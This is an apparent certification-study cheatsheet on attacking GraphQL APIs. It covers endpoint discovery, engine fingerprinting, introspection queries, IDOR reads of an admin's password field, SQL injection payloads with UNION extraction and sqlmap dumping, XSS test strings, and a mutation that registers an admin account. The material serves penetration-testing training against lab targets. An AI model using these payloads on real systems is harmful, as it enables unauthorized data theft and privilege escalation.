---
title: "CWES Cheatsheet — Attacking GraphQL"
date: 2026-03-09
categories: [Certifications, CWES]
tags: [cwes, cheatsheet, graphql, api]
---

graphql is a query language for APIs that runs on a single endpoint (usually `/graphql`). unlike REST (multiple endpoints), graphql lets clients request exactly the data they want. if not properly secured, attackers can enumerate the entire schema, access unauthorized data, and inject payloads.

---

## how graphql works

```graphql
# Query -- read data (like GET in REST)
{
  users {
    id
    username
    role
  }
}

# Query with argument -- filter results
{
  users(username: "admin") {
    id
    username
    password
  }
}

# Sub-query -- nested objects
{
  posts {
    title
    author {
      username
      role
    }
  }
}

# Mutation -- modify data (like POST/PUT/DELETE in REST)
mutation {
  registerUser(input: {username: "hacker", password: "abc123", role: "admin"}) {
    user {
      username
      role
    }
  }
}
```

**response format (always JSON):**

```json
{
  "data": {
    "users": [
      {
        "id": 1,
        "username": "htb-stdnt",
        "role": "user"
      },
      {
        "id": 2,
        "username": "admin",
        "role": "admin"
      }
    ]
  }
}
```

---

## step 1: find the graphql endpoint

```
Common endpoints:
/graphql
/api/graphql
/api/v1/graphql
/graphiql        (GraphQL IDE -- interactive playground)
/playground
/console
/query
```

> graphql APIs are typically implemented on a single endpoint that handles all queries. by accessing the `/graphql` endpoint in a browser directly, you may find a GraphiQL interface that lets you run queries interactively.
{: .prompt-info }

---

## step 2: identify the graphql engine

```bash
# Use graphw00f to fingerprint
git clone https://github.com/dolevf/graphw00f.git
python3 graphw00f/main.py -d -f -t http://TARGET

# Output example:
# [!] Found GraphQL at http://TARGET/graphql
# [*] Discovered GraphQL Engine: (Graphene)
# [!] Technologies: Python
```

> graphw00f sends various GraphQL queries, including malformed queries, and determines the engine by observing the backend's behavior and error messages. it also provides a link to the GraphQL Threat Matrix for the identified engine.
{: .prompt-info }

---

## step 3: run security audit with graphql-cop

```bash
git clone https://github.com/dolevf/graphql-cop.git
python3 graphql-cop/graphql-cop.py -t http://TARGET/graphql
```

**example output:**

```
[HIGH] Introspection - Introspection Query Enabled (Information Leakage)
[HIGH] Alias Overloading - 100+ aliases allowed (DoS)
[HIGH] Array-based Query Batching - 10+ simultaneous queries (DoS)
[HIGH] Field Duplication - 500 repeated fields allowed (DoS)
[MEDIUM] GET Method Query Support (Possible CSRF)
[LOW] Field Suggestions Enabled (Information Leakage)
[LOW] GraphiQL Explorer/Playground Enabled (Information Leakage)
```

> this gives you a baseline of all security issues to investigate further.
{: .prompt-tip }

---

## step 4: introspection (enumerate the entire schema)

introspection is a graphql feature that enables users to query the API about the structure of the backend system. users can use introspection queries to obtain all queries supported by the API schema.

**list all types:**

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

**get fields of a specific type:**

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

**list all queries:**

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

**list all mutations:**

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

**full introspection query (dumps everything):**

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

> **tip:** paste the full introspection result into [GraphQL Voyager](https://graphql-kit.com/graphql-voyager/) (click CHANGE SCHEMA -> INTROSPECTION -> paste -> DISPLAY) to visualize the entire schema. in a real engagement, host Voyager locally so no sensitive data leaves your system.
{: .prompt-tip }

---

## step 5: IDOR (access other users' data)

like REST APIs, broken authorization, particularly IDOR vulnerabilities, are common security issues in graphql.

**step 1: identify queries that take user identifiers as arguments**

```graphql
# Your profile query
{
  user(username: "htb-stdnt") {
    id
    username
    role
  }
}
```

**step 2: query another user's data**

```graphql
{
  user(username: "admin") {
    id
    username
    role
  }
}
```

**step 3: use introspection to find ALL fields (including sensitive ones)**

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type { name kind }
    }
  }
}

# Found "password" field -> add it to query
{
  user(username: "admin") {
    username
    password
  }
}
```

> always introspect types to find hidden fields like `password`, `token`, `secret`, `apiKey`, `ssn` that aren't queried by the frontend but exist in the schema.
{: .prompt-tip }

---

## step 6: SQL injection via graphql

SQL injection vulnerabilities can inherently occur in graphql APIs that do not properly sanitize user input from arguments in the SQL queries executed by the backend. we should carefully investigate all graphql queries, check whether they support arguments, and analyze these arguments for potential SQL injections.

**step 1: find queries with arguments**

```graphql
# Send query without arguments -> error reveals required argument name
{
  postByAuthor
}
# Error: "Required argument 'author' missing"

{
  user
}
# Error: "Required argument 'username' missing"
```

**step 2: test for SQLi**

```graphql
# Single quote test
{
  user(username: "'") {
    username
  }
}
# If SQL error -> SQLi confirmed

# Boolean test
{
  user(username: "admin' OR '1'='1") {
    username
  }
}
# If still returns data -> SQLi confirmed
```

**step 3: UNION injection (match column count from introspection)**

```graphql
# UserObject has 6 fields -> UNION needs 6 columns
# username is 3rd field -> 3rd column reflected in response

# Enumerate tables
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
# Response: {"username": "user,secret,post"}

# Enumerate columns of "secret" table
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='secret'-- -") {
    username
  }
}

# Extract data
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(flag),4,5,6 FROM secret-- -") {
    username
  }
}
```

> since the graphql query only returns the first row, we use `GROUP_CONCAT` to exfiltrate multiple rows at a time. the database may contain data that cannot be queried through the graphql API -- always check for sensitive tables.
{: .prompt-info }

**SQLMap with graphql:**

```bash
# Save the request from Burp to a file
# Mark injection point in the username argument
sqlmap -r graphql_request.txt --batch --dump
```

---

## step 7: XSS via graphql

XSS vulnerabilities can occur if graphql responses are inserted into the HTML page without proper sanitization. they can also occur if invalid arguments are reflected in error messages.

```graphql
# Test in arguments
{
  user(username: "<script>alert(1)</script>") {
    username
  }
}

# Test in error messages (wrong type for argument)
{
  post(id: "<script>alert(1)</script>") {
    title
  }
}
# If XSS payload reflected in error without encoding -> XSS
```

---

## step 8: privilege escalation via mutations

to identify potential attack vectors through mutations, we must thoroughly examine all supported mutations and their corresponding inputs.

**step 1: find mutations via introspection (step 4 above)**

**step 2: get mutation input fields**

```graphql
{
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
# Found: username, password, role, msg
```

**step 3: register user with admin role**

```bash
# Hash password if required
echo -n 'password' | md5sum
# 5f4dcc3b5aa765d61d8327deb882cf99
```

```graphql
mutation {
  registerUser(input: {
    username: "hacker",
    password: "5f4dcc3b5aa765d61d8327deb882cf99",
    role: "admin",
    msg: "pwned"
  }) {
    user {
      username
      role
    }
  }
}
```

```
If role: "admin" is reflected -> privilege escalation successful
Login with new admin user -> access /admin endpoint
```

> always check if mutations let you set the `role` field. if the frontend doesn't expose it but the schema accepts it, you can escalate to admin by specifying it directly.
{: .prompt-tip }

---

## tools reference

| Tool | What It Does | Usage |
|---|---|---|
| **graphw00f** | Fingerprint GraphQL engine | `python3 main.py -d -f -t http://TARGET` |
| **GraphQL-Cop** | Security audit (introspection, DoS, CSRF checks) | `python3 graphql-cop.py -t http://TARGET/graphql` |
| **GraphQL Voyager** | Visualize schema from introspection | Paste introspection result into web UI |
| **InQL** | Burp extension for GraphQL scanning | Install via BApp Store -> right-click -> Generate queries |

---

[← Back to CWES Cheatsheet Index](/posts/cwes-cheatsheet/)
